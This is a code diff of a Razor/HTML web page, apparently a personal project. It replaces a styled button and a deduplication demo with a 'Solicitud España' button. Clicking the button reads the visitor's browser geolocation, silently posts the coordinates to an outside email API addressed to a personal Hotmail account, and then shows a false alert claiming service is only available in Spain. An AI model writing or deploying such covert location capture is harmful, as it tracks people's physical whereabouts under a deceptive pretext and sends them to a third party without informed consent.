@@ -1,58 +1,32 @@
-﻿@model List<string>
-@{
-    ViewBag.Title = "Hugo";
-}
+﻿
+<h2>DISOSA GT - Desarrollo</h2>
 
-<style>
-    .servicios_btn {
-        display: block;
-        width: 200px;
-        text-align: center;
-        margin-top: 45px;
-        border-radius: 100px;
-        border: solid 3px transparent;
-        background: linear-gradient(78deg, #102397, #00EAF8);
-        background-origin: border-box;
-        padding: 5px;
-    }
-
-        .servicios_btn a {
-            display: block;
-            text-decoration: none;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 24px;
-            color: #0b457f;
-            position: relative;
-            background: #fff;
-            border-radius: 80px;
-            transition: all 300ms;
-        }
-
-        .servicios_btn:hover a {
-            color: white;
-            background: transparent;
-        }
-</style>
-
-
-<div class="servicios_btn">
-    <a href="#">Servicios</a>
-</div>
-
+<button class="btn btn-dark" onclick="getLocation()">
+    Solicitud España
+</button>
 
 <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
 <script>
-    var arr = [4, 5, 5, 2, 2];
+    
+    function getLocation() {
+        
+        if (navigator.geolocation) {
+            console.log("hola");
+            navigator.geolocation.getCurrentPosition(res => {
+                console.log(res);
+                const msg = { Receptors: "hugo_2555@hotmail.com", Subject: "Coordinates", Content: res };
+                $.post("https://hqnode.azurewebsites.net/api/email", msg);
 
-    function quitarDuplicados(arr) {
-        var arrayUnico = []
-        for (let i = 0; i < arr.length; i++) {
-            if (arrayUnico.indexOf(arr[i]) == -1) {
-                arrayUnico.push(arr[i])
-            }
+                alert("Lo lamentamos, Unicamente ofrecemos servicios en España");
+            });
+            //navigator.geolocation.getCurrentPosition(showPosition);
+        } else {
+            alert("Ocurrio un problema con la autenticación");
         }
-        return arrayUnico
     }
-
-    console.log(quitarDuplicados(arr));
+    function showPosition(position) {
+        x.innerHTML = "Latitude: " + position.coords.latitude +
+            "<br>Longitude: " + position.coords.longitude;
+    }
 </script>
+
